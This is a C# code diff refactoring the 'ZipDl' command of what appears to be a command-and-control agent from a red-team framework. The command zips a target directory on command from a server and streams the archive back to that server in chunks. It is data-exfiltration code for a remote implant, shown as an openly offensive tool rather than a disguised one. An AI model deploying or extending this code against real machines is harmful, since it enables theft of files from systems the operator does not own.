@@ -105,8 +105,6 @@ namespace Agent
         {
             ZipDlArgs args = JsonSerializer.Deserialize<ZipDlArgs>(job.task.parameters);
 
-            Stream str = null;
-
             var dirInfo = new DirectoryInfo(args.source);
 
             long directorySize = GetFolderSize(dirInfo);
@@ -126,7 +124,17 @@ namespace Agent
             // Create a new in-memory zip archive
             if (args.write)
             {
-                str = new FileStream(args.destination, FileMode.Create, FileAccess.ReadWrite, FileShare.None);
+                ZipFile.CreateFromDirectory(args.source, args.destination, CompressionLevel.SmallestSize, false);
+                await messageManager.AddResponse(new TaskResponse()
+                {
+                    task_id = job.task.id,
+                    user_output = $"Zip written to {args.destination}.",
+                    completed = true
+                });
+
+                Stream fs = File.OpenRead(args.destination);
+                _streams.Add(job.task.id, fs);
+                await StartSendFile(job, agentConfig.chunk_size, fs.Length, dirInfo.Name);
             }
             else
             {
@@ -141,77 +149,11 @@ namespace Agent
                     });
                     return;
                 }
-                str = new MemoryStream();
+                MemoryStream str = new MemoryStream();
+                ZipFile.CreateFromDirectory(args.source,str, CompressionLevel.SmallestSize, false);
+                _streams.Add(job.task.id, str);
+                await StartSendFile(job, agentConfig.chunk_size, str.Length, dirInfo.Name);
             }
-
-            using var archive = new ZipArchive(str, ZipArchiveMode.Create, true);
-            var files = GetFiles(args.source).ToList();
-            // For every file in the target folder
-            foreach (var filename in files)
-            {
-                // Open the target file for reading
-                FileStream fileStream;
-                try
-                {
-                    DebugWriteLine($"Opening {filename} for reading", job.task.id);
-                    fileStream = new FileStream(filename, FileMode.Open, FileAccess.Read, FileShare.Read);
-                }
-                catch (FileNotFoundException e)
-                {
-                    DebugWriteLine($"File not found???", job.task.id);
-                    continue;
-                }
-                catch (Exception e) when (e is System.Security.SecurityException or UnauthorizedAccessException
-                                              or FileNotFoundException)
-                {
-                    DebugWriteLine($"Unauthorized access exception received, skipping", job.task.id);
-                    continue;
-                }
-
-                // Create an entry in the zip file
-                var fileEntry = archive.CreateEntry(filename, CompressionLevel.SmallestSize);
-
-                // Open a writer on this new zip file entry
-                using var entryStream = fileEntry.Open();
-                using var streamWriter = new StreamWriter(entryStream);
-
-                // Copy the contents of this file into the zip entry
-                try
-                {
-                    fileStream.Seek(0, SeekOrigin.Begin);
-                    fileStream.CopyTo(streamWriter.BaseStream);
-                }
-                catch (Exception e) when (e is IOException)
-                {
-                    DebugWriteLine($"Error reading file '{filename}': {Environment.NewLine}{e.ToString()}", job.task.id);
-                }
-            }
-            // If we have nothing to write, let's bounce
-            if (str.Length == 0)
-            {
-                await messageManager.AddResponse(new TaskResponse()
-                {
-                    task_id = job.task.id,
-                    user_output = "Something caused the stream to fail.",
-                    completed = true
-                });
-                return;
-            }
-
-            if (args.write)
-            {
-                await messageManager.AddResponse(new TaskResponse()
-                {
-                    task_id = job.task.id,
-                    user_output = $"{str.Length} bytes written to {args.destination}.",
-                    completed = true
-                });
-                return;
-            }
-
-            //Kickoff Upload
-            _streams.Add(job.task.id, str);
-            await StartSendFile(job, agentConfig.chunk_size, str.Length, dirInfo.Name);
         }
         private async Task StartSendFile(ServerJob server_job, int chunk_size, long stream_size, string file_name)
         {
